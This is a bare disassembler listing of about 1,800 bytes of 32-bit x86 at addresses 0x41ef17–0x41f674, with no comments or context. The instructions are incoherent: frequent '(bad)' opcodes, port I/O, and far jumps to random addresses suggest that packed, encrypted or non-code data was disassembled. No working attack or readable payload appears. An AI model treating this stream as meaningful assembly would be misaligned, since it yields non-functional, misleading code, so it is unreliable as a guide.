  41ef17:	lods   eax,DWORD PTR ds:[esi]
  41ef18:	push   edx
  41ef19:	test   eax,0xf87ad94b
  41ef1e:	int    0x73
  41ef20:	lods   al,BYTE PTR ds:[esi]
  41ef21:	ror    BYTE PTR [ecx+0x118ed61d],cl
  41ef27:	adc    al,0xfa
  41ef29:	push   0xffffff82
  41ef2b:	cwde   
  41ef2c:	xlat   BYTE PTR ds:[ebx]
  41ef2d:	xor    BYTE PTR [edi+ebp*2-0x63a79caf],al
  41ef34:	jp     0x41efb2
  41ef36:	add    BYTE PTR [edi+0x2c97b01e],ah
  41ef3c:	shl    ecx,0xaf
  41ef3f:	aaa    
  41ef40:	aas    
  41ef41:	popf   
  41ef42:	call   0x7db:0xbd757a66
  41ef49:	mov    ecx,0xfff41ecc
  41ef4e:	xlat   BYTE PTR ds:[ebx]
  41ef4f:	mov    ds:0x5d2d9996,al
  41ef54:	aas    
  41ef55:	cmp    ebx,DWORD PTR [eax]
  41ef57:	push   edi
  41ef58:	mov    edx,0xb6c1c000
  41ef5d:	stos   BYTE PTR es:[edi],al
  41ef5e:	ret    0xac69
  41ef61:	es int 0xcb
  41ef64:	jbe    0x41ef8d
  41ef66:	jle    0x41ef0d
  41ef68:	push   ebx
  41ef69:	stc    
  41ef6a:	data16 mov al,BYTE PTR ds:0x1f61c786
  41ef71:	jl     0x41efb5
  41ef73:	adc    esi,edx
  41ef75:	jno    0x41efb2
  41ef77:	loopne 0x41ef5e
  41ef79:	dec    ebp
  41ef7a:	push   ds
  41ef7b:	sub    eax,0xf2a63b30
  41ef80:	mov    dl,cl
  41ef82:	sub    DWORD PTR [ebp+0x55],ebx
  41ef85:	sbb    al,0x62
  41ef87:	xlat   BYTE PTR ds:[ebx]
  41ef88:	repnz lea ecx,[edx+eax*8-0x7e]
  41ef8d:	call   0xf00c:0x77a9caea
  41ef94:	jns    0x41ef22
  41ef96:	push   edx
  41ef97:	and    DWORD PTR [esi],edi
  41ef99:	rcl    ecx,cl
  41ef9b:	add    edi,esp
  41ef9d:	inc    esi
  41ef9e:	test   eax,0xa427115
  41efa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efa4:	fcmovnb st,st(2)
  41efa6:	call   0xa5bc4358
  41efab:	das    
  41efac:	adc    esi,edi
  41efae:	out    0x7c,al
  41efb0:	pop    ecx
  41efb1:	pusha  
  41efb2:	mov    bh,BYTE PTR [eax+0x51f3c73f]
  41efb8:	aad    0xc7
  41efba:	push   esp
  41efbb:	(bad)  
  41efbc:	push   ss
  41efbd:	push   ds
  41efbe:	scas   eax,DWORD PTR es:[edi]
  41efbf:	call   0x892a:0xff2122f2
  41efc6:	push   edx
  41efc7:	adc    ecx,ebx
  41efc9:	lahf   
  41efca:	fisubr DWORD PTR [edx-0x2e76ad44]
  41efd0:	push   ecx
  41efd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd2:	mov    ch,0x7f
  41efd4:	pop    ds
  41efd5:	mov    cl,BYTE PTR [edi+0x40]
  41efd8:	lea    edi,[eax-0x3f67bd13]
  41efde:	pop    esi
  41efdf:	sub    esi,DWORD PTR [eax+0x38]
  41efe2:	das    
  41efe3:	inc    esp
  41efe4:	push   esi
  41efe5:	in     eax,0xda
  41efe7:	lds    ebp,FWORD PTR [eax]
  41efe9:	add    BYTE PTR [ebx],al
  41efeb:	pop    ss
  41efec:	push   ebp
  41efed:	clc    
  41efee:	pop    ds
  41efef:	inc    ecx
  41eff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff1:	add    DWORD PTR [ebx-0x379db466],ebp
  41eff7:	push   ecx
  41eff8:	out    0xec,al
  41effa:	stos   BYTE PTR es:[edi],al
  41effb:	dec    eax
  41effc:	jecxz  0x41f01e
  41effe:	rep outs dx,DWORD PTR ds:[esi]
  41f000:	sti    
  41f001:	lea    ebp,[ecx+esi*8+0x1e]
  41f005:	and    al,0x9d
  41f007:	lods   eax,DWORD PTR ds:[esi]
  41f008:	mov    ds:0xe2b32bc4,al
  41f00d:	jle    0x41efb1
  41f00f:	and    ecx,DWORD PTR [esi+0x3e298921]
  41f015:	das    
  41f016:	mov    eax,ds:0x3299a48e
  41f01b:	out    dx,eax
  41f01c:	xchg   esi,eax
  41f01d:	mov    ds:0x9a0df70a,eax
  41f023:	push   ecx
  41f024:	push   edx
  41f025:	pop    ebx
  41f026:	add    al,0x83
  41f028:	aaa    
  41f029:	aad    0xca
  41f02b:	fisubr WORD PTR [ecx]
  41f02d:	or     DWORD PTR [edi+0x42bbd150],ebp
  41f033:	push   ebp
  41f034:	shr    BYTE PTR [ebx+edx*2+0x2d],0xb
  41f039:	aad    0x42
  41f03b:	retf   
  41f03c:	pop    es
  41f03d:	pop    ebx
  41f03e:	(bad)  gs:[ebp+0x75b90820]
  41f045:	mov    bh,0x51
  41f047:	(bad)  
  41f049:	in     al,dx
  41f04a:	pop    ds
  41f04b:	es je  0x41efdc
  41f04e:	inc    esp
  41f04f:	les    esi,FWORD PTR [ebp-0xf6226e7]
  41f055:	iret   
  41f056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f057:	out    dx,al
  41f058:	mov    ah,0x5
  41f05a:	stos   DWORD PTR es:[edi],eax
  41f05b:	jmp    0x6b9:0x1738fa35
  41f062:	cmp    BYTE PTR [ecx],dh
  41f064:	xchg   ecx,eax
  41f065:	jecxz  0x41f0af
  41f067:	scas   eax,DWORD PTR es:[edi]
  41f068:	sbb    DWORD PTR [esi],esp
  41f06a:	jmp    0x65171d06
  41f06f:	retf   0xf84d
  41f072:	and    eax,0x74da9f94
  41f077:	outs   dx,DWORD PTR ds:[esi]
  41f078:	stos   BYTE PTR es:[edi],al
  41f079:	fnstsw WORD PTR [ecx+0x4641ac12]
  41f07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f080:	fwait
  41f081:	out    0xb2,eax
  41f083:	adc    BYTE PTR [ebx-0x19],0xe8
  41f087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f088:	jp     0x41f05d
  41f08a:	outs   dx,BYTE PTR ds:[esi]
  41f08b:	ror    al,1
  41f08d:	aad    0x24
  41f08f:	pop    esi
  41f090:	in     eax,0x12
  41f092:	popa   
  41f093:	cmp    eax,0xd43251ad
  41f098:	fdiv   QWORD PTR [esp+eiz*4+0x343676a1]
  41f09f:	cmp    al,0x9a
  41f0a1:	add    eax,0xef10d92f
  41f0a6:	sbb    DWORD PTR [edi-0x4a],edi
  41f0a9:	lods   al,BYTE PTR ds:[esi]
  41f0aa:	and    al,0x2f
  41f0ac:	addr16 push ebx
  41f0ae:	mov    ah,0x2f
  41f0b0:	mov    dl,0xed
  41f0b2:	dec    ecx
  41f0b3:	lods   eax,DWORD PTR ds:[esi]
  41f0b4:	pop    ds
  41f0b5:	rol    BYTE PTR [ebx-0x53dc8ef7],cl
  41f0bb:	jmp    0x41f05f
  41f0bd:	and    DWORD PTR [eax-0x7],esp
  41f0c0:	add    eax,DWORD PTR [ebx-0x5]
  41f0c3:	inc    esp
  41f0c4:	rep stos BYTE PTR es:[edi],al
  41f0c6:	fwait
  41f0c7:	adc    edx,esi
  41f0c9:	add    ecx,DWORD PTR [ebx-0x51a2f646]
  41f0cf:	pop    ss
  41f0d0:	jecxz  0x41f0e2
  41f0d2:	jo     0x41f061
  41f0d4:	inc    ebp
  41f0d5:	shl    BYTE PTR [edx+edi*1-0x9],0x44
  41f0da:	jmp    0x41f08a
  41f0dc:	pop    ss
  41f0dd:	xor    DWORD PTR [esi-0x3c],edx
  41f0e0:	xchg   edi,eax
  41f0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0e2:	jmp    0x41f0c3
  41f0e4:	pop    esp
  41f0e5:	mov    al,fs:0xe5a00758
  41f0eb:	mov    esi,0x2ae648c
  41f0f0:	scas   al,BYTE PTR es:[edi]
  41f0f1:	adc    ch,BYTE PTR [edx-0x65]
  41f0f4:	(bad)  
  41f0f5:	jmp    0x41f12c
  41f0f7:	push   esi
  41f0f8:	lock cmp DWORD PTR ds:0x8bc9d1d,ebp
  41f0ff:	test   al,0x7e
  41f101:	cmp    bh,BYTE PTR [ebx+0x1c3d011]
  41f107:	retf   0x5ad8
  41f10a:	das    
  41f10b:	sbb    cl,dh
  41f10d:	(bad)  
  41f10e:	add    DWORD PTR fs:0x91d03412,ebp
  41f115:	ja     0x41f179
  41f117:	in     al,dx
  41f118:	jmp    0x952ca346
  41f11d:	fistp  QWORD PTR [esi-0x1b2d03c4]
  41f123:	xchg   ecx,eax
  41f124:	cld    
  41f125:	lods   eax,DWORD PTR ds:[esi]
  41f126:	(bad)  
  41f128:	and    eax,ebx
  41f12a:	pop    ebx
  41f12b:	push   es
  41f12c:	bound  ebx,QWORD PTR [ebp-0x68f7807e]
  41f132:	push   ss
  41f133:	adc    al,0x79
  41f135:	pop    ds
  41f136:	xlat   BYTE PTR ds:[ebx]
  41f137:	shr    DWORD PTR [ebp-0x245ae01a],0x1c
  41f13e:	push   0xe53ca7b8
  41f143:	or     BYTE PTR [ebp-0x48fea1c4],0x11
  41f14a:	jb     0x41f0e6
  41f14c:	fs enter 0x51eb,0xbc
  41f151:	jb     0x41f1d0
  41f153:	adc    BYTE PTR [esi-0x56],al
  41f156:	cli    
  41f157:	mov    al,ds:0x4290ad5f
  41f15c:	xlat   BYTE PTR ds:[ebx]
  41f15d:	inc    ebx
  41f15e:	out    dx,eax
  41f15f:	push   edx
  41f160:	sar    dh,cl
  41f162:	stos   BYTE PTR es:[edi],al
  41f163:	or     al,0xb4
  41f165:	inc    esp
  41f166:	rcl    BYTE PTR [ecx+eiz*8+0x1aafae8e],1
  41f16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f16e:	and    al,BYTE PTR [esi]
  41f170:	adc    eax,0xc018edce
  41f175:	mov    ds:0x7bb700e7,eax
  41f17a:	dec    eax
  41f17b:	adc    DWORD PTR [eax],esi
  41f17d:	sbb    BYTE PTR [esi+0x0],ah
  41f180:	and    eax,0xe34e2016
  41f185:	loope  0x41f11a
  41f187:	paddq  mm1,mm4
  41f18a:	mov    bl,0x1d
  41f18c:	mov    cl,BYTE PTR [ecx+0x48]
  41f18f:	inc    ebp
  41f190:	add    eax,0x5c490502
  41f195:	push   0x7cd0c25d
  41f19a:	adc    ch,BYTE PTR [ecx]
  41f19c:	jno    0x41f17e
  41f19e:	in     al,dx
  41f19f:	and    al,BYTE PTR [esp+ebp*1-0x57a484de]
  41f1a6:	mov    edi,0xbdc8334a
  41f1ab:	dec    edi
  41f1ac:	xlat   BYTE PTR ds:[ebx]
  41f1ad:	sti    
  41f1ae:	mov    bh,0xbf
  41f1b0:	stos   DWORD PTR es:[edi],eax
  41f1b1:	xor    edx,esp
  41f1b3:	push   esp
  41f1b4:	das    
  41f1b5:	dec    edi
  41f1b6:	fmul   DWORD PTR [edx-0x681ecb14]
  41f1bc:	xor    BYTE PTR [esi-0x9],0x9
  41f1c0:	popf   
  41f1c1:	jg     0x41f159
  41f1c3:	dec    ecx
  41f1c4:	fsub   DWORD PTR [eax]
  41f1c6:	out    dx,eax
  41f1c7:	hlt    
  41f1c8:	and    ch,BYTE PTR [ecx+0xfc4fd1f]
  41f1ce:	xchg   DWORD PTR [esi+0x1e9cf9c7],esi
  41f1d4:	jne    0x41f1eb
  41f1d6:	imul   ecx,DWORD PTR [esi-0x7d305729],0xfffffff2
  41f1dd:	push   esp
  41f1de:	or     eax,0x962868ae
  41f1e3:	add    edi,ecx
  41f1e5:	sti    
  41f1e6:	adc    eax,0x2d975eee
  41f1eb:	adc    BYTE PTR es:[edx+0x548c7eaf],bl
  41f1f2:	jo     0x41f21a
  41f1f4:	dec    eax
  41f1f5:	xor    ebp,ebp
  41f1f7:	lods   al,BYTE PTR ds:[esi]
  41f1f8:	jne    0x41f180
  41f1fa:	call   0x4351:0x584b2d7f
  41f201:	js     0x41f24e
  41f203:	lods   al,BYTE PTR ds:[esi]
  41f204:	pop    ebx
  41f205:	jbe    0x41f201
  41f207:	push   esi
  41f208:	add    BYTE PTR [eax+0x679d4e0f],0x76
  41f20f:	retf   
  41f210:	sbb    eax,ebx
  41f212:	ret    
  41f213:	mov    al,0x70
  41f215:	push   esp
  41f216:	jb     0x41f22e
  41f218:	xchg   DWORD PTR [ecx+0x43],esi
  41f21b:	pop    eax
  41f21c:	xor    cl,BYTE PTR [edx-0x2c100b22]
  41f222:	and    BYTE PTR [edi+ebx*4+0x61d2666f],0x6
  41f22a:	dec    ecx
  41f22b:	fucomp st(5)
  41f22d:	(bad)  
  41f22e:	sub    bh,BYTE PTR es:[ecx*2+0x276294d5]
  41f236:	or     eax,0x5b95ee72
  41f23b:	sbb    esp,eax
  41f23d:	pop    eax
  41f23e:	xchg   bh,ah
  41f240:	loop   0x41f1c6
  41f242:	jmp    0x18e1be25
  41f247:	xchg   esp,eax
  41f248:	push   edi
  41f249:	sbb    eax,DWORD PTR ds:0xda3f8df7
  41f24f:	jo     0x41f223
  41f251:	out    0xa1,eax
  41f253:	daa    
  41f254:	cwde   
  41f255:	xor    al,0x65
  41f257:	mov    ebp,0x24b0a3a9
  41f25c:	jne    0x41f1ea
  41f25e:	jl     0x41f29a
  41f260:	inc    esp
  41f261:	inc    ebx
  41f262:	jl     0x41f258
  41f264:	stos   DWORD PTR es:[edi],eax
  41f265:	dec    ecx
  41f266:	test   al,0xc6
  41f268:	loopne 0x41f204
  41f26a:	or     eax,0x8b8d19c1
  41f26f:	jae    0x41f2af
  41f271:	jp     0x41f2e6
  41f273:	rol    DWORD PTR [edx-0x35],cl
  41f276:	pop    fs
  41f278:	ret    
  41f279:	ja     0x41f2ba
  41f27b:	mov    dl,0xf6
  41f27d:	add    DWORD PTR [edi-0x49],0x9cf8abf0
  41f284:	ret    0xda72
  41f287:	mov    ebp,0x5b293d08
  41f28c:	ss cmc 
  41f28e:	xchg   edx,eax
  41f28f:	or     BYTE PTR [edi-0x2a],ah
  41f292:	cwde   
  41f293:	ret    
  41f294:	test   eax,0x1e6a25f
  41f299:	mov    eax,0x413ca6bc
  41f29e:	lds    edx,FWORD PTR [eax+esi*1]
  41f2a1:	movq   mm4,QWORD PTR [ecx*2-0x2fa139c9]
  41f2a9:	lds    esi,FWORD PTR [esi+0x7a]
  41f2ac:	push   es
  41f2ad:	imul   ebx,esp,0xd6da1987
  41f2b3:	ret    
  41f2b4:	push   ebp
  41f2b5:	pop    edx
  41f2b6:	sbb    eax,0x5ce3dbc8
  41f2bb:	mov    dh,0xc1
  41f2bd:	jbe    0x41f250
  41f2bf:	lods   eax,DWORD PTR ds:[esi]
  41f2c0:	not    DWORD PTR [ebp-0x2c]
  41f2c3:	ror    BYTE PTR [ebp+0x4f3825a9],cl
  41f2c9:	cmp    al,0x76
  41f2cb:	clc    
  41f2cc:	jbe    0x41f2cd
  41f2ce:	lods   eax,DWORD PTR ds:[esi]
  41f2cf:	inc    esi
  41f2d0:	sahf   
  41f2d1:	scas   eax,DWORD PTR es:[edi]
  41f2d2:	inc    ebp
  41f2d3:	call   0x2e8f:0x981a311d
  41f2da:	es jae 0x41f337
  41f2dd:	inc    edi
  41f2de:	dec    eax
  41f2df:	pop    esp
  41f2e0:	mov    esi,0xf3e69ac8
  41f2e5:	xor    ch,ah
  41f2e7:	pop    ebx
  41f2e8:	retf   
  41f2e9:	sub    esi,edx
  41f2eb:	bound  ebx,QWORD PTR [esi]
  41f2ed:	add    DWORD PTR [ecx+eiz*2],eax
  41f2f0:	shl    DWORD PTR [ebp-0x54cb9eed],0xb5
  41f2f7:	shr    al,1
  41f2f9:	or     eax,0x45569e5f
  41f2fe:	push   ebx
  41f2ff:	or     BYTE PTR [ebp+0x54],bh
  41f302:	aad    0x8c
  41f304:	mov    al,0x27
  41f306:	out    dx,eax
  41f307:	xor    esp,DWORD PTR [edx*1+0x3648e5ec]
  41f30e:	push   ds
  41f30f:	add    BYTE PTR [edi+0x75da94c2],dl
  41f315:	in     eax,dx
  41f316:	(bad)  
  41f317:	jp     0x41f35a
  41f319:	outs   dx,BYTE PTR ds:[esi]
  41f31a:	cmp    bh,BYTE PTR [bx+si-0x11d6]
  41f31f:	std    
  41f320:	in     al,dx
  41f321:	cmp    BYTE PTR [ebx],al
  41f323:	outs   dx,BYTE PTR ds:[esi]
  41f324:	jl     0x41f2fb
  41f326:	xchg   ecx,eax
  41f327:	pushf  
  41f328:	and    al,0x6b
  41f32a:	mov    edx,?
  41f32c:	scas   al,BYTE PTR es:[edi]
  41f32d:	xchg   ebp,eax
  41f32e:	dec    ebx
  41f32f:	pop    esp
  41f330:	pop    edi
  41f331:	mov    edx,0xcf5674f0
  41f336:	(bad)  
  41f337:	lods   al,BYTE PTR ds:[esi]
  41f338:	les    esp,FWORD PTR [ecx-0x27]
  41f33b:	scas   eax,DWORD PTR es:[edi]
  41f33c:	mov    ds:0x625bce72,eax
  41f341:	and    eax,0x63ea0dc4
  41f346:	pop    esp
  41f347:	cs mov edi,0x552c0099
  41f34d:	add    al,0x2e
  41f34f:	cmp    DWORD PTR [ebx],0xbf9ec457
  41f355:	fist   DWORD PTR [eax]
  41f357:	jbe    0x41f3a4
  41f359:	jp     0x41f2f7
  41f35b:	sahf   
  41f35c:	mov    edx,0x7b7842a7
  41f361:	outs   dx,BYTE PTR ds:[esi]
  41f362:	xchg   esi,eax
  41f363:	xchg   esi,eax
  41f364:	add    ebx,DWORD PTR [ecx+0x28dc2cb3]
  41f36a:	cli    
  41f36b:	dec    edx
  41f36c:	and    al,0xfb
  41f36e:	and    al,BYTE PTR [edx-0x2b7efcfa]
  41f374:	mov    esi,0x9bda1ac5
  41f379:	mov    dl,0x39
  41f37b:	in     al,dx
  41f37c:	push   ebx
  41f37d:	push   edx
  41f37e:	adc    DWORD PTR [edx],ecx
  41f380:	fnstsw WORD PTR [edi-0x2624b962]
  41f386:	mov    esp,0xc1a7c935
  41f38b:	je     0x41f349
  41f38d:	push   esi
  41f38e:	test   ch,dh
  41f390:	mov    fs,esp
  41f392:	cmp    eax,0xd46ae573
  41f397:	pop    esi
  41f398:	pop    esi
  41f399:	in     al,0x3b
  41f39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f39c:	dec    edi
  41f39d:	lea    esp,ds:0xd85434cf
  41f3a3:	cmp    al,0x18
  41f3a5:	dec    edi
  41f3a6:	dec    ebp
  41f3a7:	jmp    DWORD PTR [edx+0x2457243c]
  41f3ad:	xchg   ecx,eax
  41f3ae:	jmp    0xa69cf8e1
  41f3b3:	jbe    0x41f39f
  41f3b5:	daa    
  41f3b6:	mov    ds:0x46dd5eda,eax
  41f3bb:	xor    al,0x39
  41f3bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3be:	(bad)  
  41f3c0:	mov    ah,0x92
  41f3c2:	call   0x1e81537d
  41f3c7:	fimul  WORD PTR [edx]
  41f3c9:	cmp    DWORD PTR [esi+edx*2+0x40bb7e43],edx
  41f3d0:	(bad)  
  41f3d1:	aaa    
  41f3d2:	xor    eax,0x47b7d672
  41f3d7:	hlt    
  41f3d8:	cmp    al,0x42
  41f3da:	jne    0x41f3bb
  41f3dc:	cld    
  41f3dd:	push   edx
  41f3de:	inc    edi
  41f3df:	addr16 mov ecx,0x2c26fea7
  41f3e5:	push   ebp
  41f3e6:	fnstcw WORD PTR ds:0x84155656
  41f3ec:	sbb    edi,DWORD PTR [esi+0x17]
  41f3ef:	or     DWORD PTR [ebp+0x217d01f0],0x8e49cabd
  41f3f9:	hlt    
  41f3fa:	mov    ss,esi
  41f3fc:	sti    
  41f3fd:	icebp  
  41f3fe:	sbb    eax,0x2c6b7876
  41f403:	(bad)  
  41f404:	popa   
  41f405:	dec    ebx
  41f406:	dec    ebx
  41f407:	dec    esi
  41f408:	ror    DWORD PTR [ebx-0x7b115af2],1
  41f40e:	(bad)  
  41f40f:	stc    
  41f410:	push   edi
  41f411:	pop    ecx
  41f412:	dec    esp
  41f413:	sub    esp,DWORD PTR [eax]
  41f415:	pop    edx
  41f417:	and    bl,al
  41f419:	scas   al,BYTE PTR es:[edi]
  41f41a:	jne    0x41f44f
  41f41c:	inc    esp
  41f41d:	add    DWORD PTR [ebx+0x4d],esi
  41f420:	pop    ebp
  41f421:	int    0xb3
  41f423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f424:	or     bh,dl
  41f426:	imul   edi,eax,0xffffffbe
  41f429:	mov    cl,0x46
  41f42b:	mov    dl,0xce
  41f42d:	stos   DWORD PTR es:[edi],eax
  41f42e:	(bad)  
  41f42f:	out    dx,eax
  41f430:	aad    0x1e
  41f432:	jmp    0xdd41d8f0
  41f437:	xlat   BYTE PTR ds:[ebx]
  41f438:	push   cs
  41f439:	adc    BYTE PTR [eax],bl
  41f43b:	(bad)  
  41f43c:	(bad)  
  41f43d:	sti    
  41f43e:	mov    bh,0xff
  41f440:	rcr    DWORD PTR [esi-0x12c5280],1
  41f446:	mov    bl,0xe6
  41f448:	add    DWORD PTR [edx+eiz*2-0x4b],edi
  41f44c:	iret   
  41f44d:	sub    BYTE PTR [edi-0x113254b3],cl
  41f453:	mov    edx,0x3cf2d16e
  41f458:	scas   al,BYTE PTR es:[edi]
  41f459:	ss into 
  41f45b:	pop    esp
  41f45c:	push   edx
  41f45d:	nop
  41f45e:	and    ah,BYTE PTR [ecx+eax*8+0x64]
  41f462:	shl    BYTE PTR [edx-0x70],0x60
  41f466:	or     al,0xb6
  41f468:	inc    ecx
  41f469:	xlat   BYTE PTR ds:[ebx]
  41f46a:	dec    edx
  41f46b:	fdiv   DWORD PTR [eax]
  41f46d:	ds jae 0x41f438
  41f470:	icebp  
  41f471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f472:	dec    edi
  41f473:	outs   dx,DWORD PTR ds:[esi]
  41f474:	shl    edx,0x70
  41f477:	fdivr  QWORD PTR [ecx+0x5fe5a0b9]
  41f47d:	cmp    DWORD PTR [edx+eiz*4-0x193c5562],esp
  41f484:	lock push eax
  41f486:	pop    ds
  41f487:	push   DWORD PTR [ebx-0x6e]
  41f48a:	dec    ebp
  41f48b:	pop    ecx
  41f48c:	imul   edi,ebx,0x42
  41f48f:	call   ebp
  41f491:	or     al,0x39
  41f493:	xor    esp,DWORD PTR [eax+ebp*2]
  41f496:	sbb    ebp,DWORD PTR [ecx]
  41f498:	hlt    
  41f499:	mov    dh,0x9b
  41f49b:	in     al,dx
  41f49c:	jmp    0x41f481
  41f49e:	test   al,0xdd
  41f4a0:	imul   DWORD PTR [eax]
  41f4a2:	push   ebx
  41f4a3:	add    BYTE PTR ss:[ecx+ebx*1-0x5e552e0c],ah
  41f4ab:	mov    ecx,0xbc462559
  41f4b0:	dec    DWORD PTR [eax+0x3bc0720a]
  41f4b6:	pop    fs
  41f4b8:	inc    ebp
  41f4b9:	je     0x41f515
  41f4bb:	or     al,0x47
  41f4bd:	test   BYTE PTR [esi+eiz*1+0x6a],al
  41f4c1:	xor    edx,DWORD PTR [eiz*4+0x38e3490d]
  41f4c8:	push   esp
  41f4c9:	jle    0x41f4ee
  41f4cb:	inc    edx
  41f4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4cd:	in     eax,0xf8
  41f4cf:	add    eax,0xac16caf8
  41f4d4:	frstor [ecx+esi*4+0x7bf6c124]
  41f4db:	and    al,0x88
  41f4dd:	std    
  41f4de:	in     al,dx
  41f4df:	cmp    ebx,edx
  41f4e1:	xor    BYTE PTR [eax-0x39d09462],0x3f
  41f4e8:	out    0x7f,eax
  41f4ea:	mov    al,ds:0x1c099a63
  41f4ef:	shl    BYTE PTR [ebx+0x24],0x6a
  41f4f3:	dec    esp
  41f4f4:	push   ebp
  41f4f5:	out    dx,al
  41f4f6:	jp     0x41f56f
  41f4f8:	and    al,0xc1
  41f4fa:	or     ebx,DWORD PTR [eax-0x36]
  41f4fd:	cs nop
  41f4ff:	test   eax,0x99ca466e
  41f504:	mov    WORD PTR [edx],?
  41f506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f507:	retf   
  41f508:	push   ss
  41f509:	jns    0x41f4ea
  41f50b:	push   ebx
  41f50c:	iret   
  41f50d:	ret    0x4360
  41f510:	mov    DWORD PTR [edi+edx*4+0x19c62d9b],0xdc46724a
  41f51b:	jecxz  0x41f4a2
  41f51d:	call   FWORD PTR [edx+0x2d0b15b2]
  41f523:	shr    BYTE PTR [esi],1
  41f525:	je     0x41f503
  41f527:	std    
  41f528:	fbld   TBYTE PTR [edi-0x5f]
  41f52b:	xchg   BYTE PTR [edx],dl
  41f52d:	dec    ebp
  41f52e:	lea    esi,[ebx]
  41f530:	cdq    
  41f531:	mov    ch,BYTE PTR [ebp+0x6c9a9976]
  41f537:	xor    edx,esi
  41f539:	call   DWORD PTR [ecx]
  41f53b:	nop
  41f53c:	sub    ecx,esp
  41f53e:	mov    DWORD PTR [ebp-0x173a3d50],0x5744b715
  41f548:	imul   DWORD PTR [edx+0x904309f]
  41f54e:	push   esi
  41f54f:	stos   BYTE PTR es:[edi],al
  41f550:	xor    BYTE PTR [eax],bl
  41f552:	fs jb  0x41f57f
  41f555:	mov    BYTE PTR [ebp-0x5c6aeb41],ah
  41f55b:	jb     0x41f55d
  41f55d:	std    
  41f55e:	fdiv   DWORD PTR [edx]
  41f560:	adc    al,0xf6
  41f562:	adc    BYTE PTR [edi-0x34e20b33],0xe9
  41f569:	jne    0x41f594
  41f56b:	imul   eax,DWORD PTR [esi],0x6
  41f56e:	stos   BYTE PTR es:[edi],al
  41f56f:	setl   BYTE PTR [ebp+0x85b02]
  41f576:	xchg   esp,eax
  41f577:	js     0x41f57d
  41f579:	clc    
  41f57a:	dec    ecx
  41f57b:	or     ebx,ecx
  41f57d:	mov    bh,BYTE PTR [ebp-0x7d7c790]
  41f583:	cmp    ecx,DWORD PTR [ecx-0x22]
  41f586:	add    eax,0x6a032d99
  41f58b:	ja     0x41f60a
  41f58d:	push   ds
  41f58e:	pop    edi
  41f58f:	mov    dh,0x4e
  41f591:	jo     0x41f51a
  41f593:	mov    bh,0x47
  41f595:	xchg   DWORD PTR [eax+0x11],edx
  41f598:	mov    dh,0xc6
  41f59a:	ss cmp eax,0xa6e38ad7
  41f5a0:	ror    eax,0xb8
  41f5a3:	mov    ds:0xd976d4e,eax
  41f5a8:	inc    ecx
  41f5a9:	jmp    ebp
  41f5ab:	ds (bad) 
  41f5ae:	fwait
  41f5af:	mov    ds:0x95d773bd,eax
  41f5b4:	xchg   edx,eax
  41f5b5:	mov    DWORD PTR [ebx+ebx*2],edi
  41f5b8:	loopne 0x41f628
  41f5ba:	ins    BYTE PTR es:[edi],dx
  41f5bb:	cdq    
  41f5bc:	cld    
  41f5bd:	push   ss
  41f5be:	pop    esi
  41f5bf:	and    DWORD PTR [edi],ebx
  41f5c1:	push   esp
  41f5c2:	push   0xffffffac
  41f5c4:	and    ebp,esi
  41f5c6:	cld    
  41f5c7:	xor    eax,edi
  41f5c9:	pushf  
  41f5ca:	push   ss
  41f5cb:	mov    edi,0xf57f0210
  41f5d0:	and    bh,BYTE PTR gs:[ebx]
  41f5d3:	cmp    eax,0xf1429b36
  41f5d8:	mov    edx,0x7d1b832e
  41f5dd:	ror    BYTE PTR [ecx-0x50556872],0xe6
  41f5e4:	push   eax
  41f5e5:	out    0xeb,al
  41f5e7:	jle    0x41f59d
  41f5e9:	fisttp WORD PTR [ebx-0x40]
  41f5ec:	mov    ds:0x854c79f3,al
  41f5f1:	sbb    al,0x6d
  41f5f3:	shl    DWORD PTR [ecx+0x34],1
  41f5f6:	inc    ecx
  41f5f7:	jno    0x41f5f2
  41f5f9:	xor    ah,dl
  41f5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5fc:	or     dl,BYTE PTR [edi-0x2]
  41f5ff:	pop    esp
  41f600:	push   ss
  41f601:	in     eax,dx
  41f602:	(bad)  
  41f603:	push   ebx
  41f604:	js     0x41f61b
  41f606:	in     al,0x9a
  41f608:	cdq    
  41f609:	mov    dh,0xfd
  41f60b:	or     dh,BYTE PTR [eiz*2-0x40d44557]
  41f612:	inc    edi
  41f613:	add    edi,DWORD PTR [ebp+0x76]
  41f616:	ret    0x350d
  41f619:	cli    
  41f61a:	and    bl,bh
  41f61c:	cwde   
  41f61d:	sbb    bl,bl
  41f61f:	shr    DWORD PTR [esi+0x50],0x3e
  41f623:	mov    edi,0xc1eceb1e
  41f628:	mov    eax,0x296a06c
  41f62d:	imul   esi,DWORD PTR [ebp-0x4f3d42ff],0x2dd7c784
  41f637:	jo     0x41f5e7
  41f639:	in     al,dx
  41f63a:	retf   0x27cb
  41f63d:	outs   dx,BYTE PTR ds:[esi]
  41f63e:	mov    al,ds:0xbe0bd596
  41f643:	test   BYTE PTR [ebx+0x47552c6b],dh
  41f649:	ins    DWORD PTR es:[edi],dx
  41f64a:	inc    edx
  41f64b:	loopne 0x41f697
  41f64d:	stos   BYTE PTR es:[edi],al
  41f64e:	(bad)
  41f651:	xchg   ebx,eax
  41f652:	sbb    ecx,DWORD PTR [ecx-0x56]
  41f655:	aam    0x19
  41f657:	out    0xec,al
  41f659:	cld    
  41f65a:	add    eax,0x7c3799fd
  41f65f:	popa   
  41f660:	int3   
  41f661:	test   al,0x5b
  41f663:	repz push ecx
  41f665:	mov    al,0x7f
  41f667:	shr    BYTE PTR [ecx+edi*4-0x642e5f23],cl
  41f66e:	push   edx
  41f66f:	jb     0x41f669
  41f671:	mov    ch,0xac
  41f673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f674:	(bad)  
